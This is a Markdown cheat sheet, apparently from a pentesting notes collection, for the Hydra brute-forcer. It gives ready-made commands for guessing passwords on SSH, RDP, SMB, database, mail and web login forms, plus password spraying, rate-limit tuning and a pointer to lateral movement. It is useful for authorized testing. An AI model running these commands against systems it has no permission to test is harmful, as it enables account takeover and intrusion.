# 🛠️ Hydra

> **Category:** Network Login Brute-Forcer (Parallelized)
> **When to Use:** When you have a login form and need to brute-force credentials.

---

## 📋 Basic Syntax

```bash
hydra -l <user> -P <wordlist> <target> <protocol>
hydra -L <userlist> -P <wordlist> <target> <protocol>
```

| Flag | Description |
|------|-------------|
| `-l` | Single username |
| `-L` | Username list file |
| `-p` | Single password |
| `-P` | Password list file |
| `-t` | Threads (parallel connections) |
| `-f` | Stop after first valid pair found |
| `-V` | Verbose (show each attempt) |
| `-s` | Custom port |
| `-o` | Output results to file |
| `-e nsr` | Try null password (n), login as pass (s), reversed login (r) |

---

## 🎯 Protocol-Specific Commands

### SSH
```bash
# Single user, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4

# User list + password list
hydra -L users.txt -P passwords.txt ssh://<target> -t 4 -f
```
> ⚠️ Keep threads LOW (4) for SSH to avoid lockouts and connection resets.

### FTP
```bash
hydra -l anonymous -P passwords.txt ftp://<target> -t 10
```

### RDP
```bash
hydra -l administrator -P passwords.txt rdp://<target> -t 4
```

### SMB
```bash
hydra -L users.txt -P passwords.txt smb://<target> -t 4
```

### MySQL
```bash
hydra -l root -P passwords.txt mysql://<target>
```

### MSSQL
```bash
hydra -l sa -P passwords.txt mssql://<target>
```

### SMTP
```bash
hydra -l user@target.com -P passwords.txt smtp://<target> -t 4
```

### POP3
```bash
hydra -l user -P passwords.txt pop3://<target>
```

---

## 🌐 Web Form Brute-Force

### HTTP POST Form
```bash
hydra -l admin -P wordlist.txt <target> http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

**Syntax breakdown:** `"<path>:<POST body>:<failure condition>"`
- `^USER^` = placeholder for username
- `^PASS^` = placeholder for password
- `F=` = failure string (found in failed login response)
- `S=` = success string (alternative: match on success)

### HTTP GET Form
```bash
hydra -l admin -P wordlist.txt <target> http-get-form \
  "/login:username=^USER^&password=^PASS^:F=Login failed"
```

### HTTP Basic Auth
```bash
hydra -l admin -P wordlist.txt <target> http-get /admin
```

### With Cookies/Headers
```bash
hydra -l admin -P wordlist.txt <target> http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=failed:H=Cookie: session=abc123"
```

---

## 💡 Expert One-Liners

```bash
# SSH with common creds (try empty pass, user=pass, reversed)
hydra -l root -P rockyou.txt ssh://<target> -t 4 -e nsr -f

# Web login with custom failure detection
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:F=is incorrect" -t 30 -f

# Password spray (one password, many users)
hydra -L users.txt -p 'Password123!' smb://<target> -t 4 -f

# Brute-force with custom port
hydra -l admin -P passwords.txt -s 8080 <target> http-post-form \
  "/api/login:user=^USER^&pass=^PASS^:F=401"
```

---

## ⚠️ Important Notes

| Consideration | Details |
|---------------|---------|
| **Account lockout** | Check lockout policy BEFORE brute-forcing |
| **Thread count** | SSH/RDP: max 4. HTTP: can go 30-50 |
| **Detection** | Extremely noisy — generates thousands of log entries |
| **Rate limiting** | If getting blocked, reduce threads and add `-W 2` (wait 2s) |
| **Wordlists** | Start small (top 100), then expand to rockyou |

---

## 📂 Recommended Wordlists

| Wordlist | Location (Kali) | Use Case |
|----------|-----------------|----------|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | General passwords |
| SecLists passwords | `/usr/share/seclists/Passwords/` | Categorized lists |
| Default credentials | `/usr/share/seclists/Passwords/Default-Credentials/` | Service defaults |
| Common usernames | `/usr/share/seclists/Usernames/` | Username enumeration |

---

## 🔗 Links

- Before Hydra → enumerate valid usernames first (reduces noise)
- Alternative: CrackMapExec (for SMB/AD), Medusa, Patator
- Combine with: Username enumeration (timing attacks, error messages)
- After success → use credentials for lateral movement
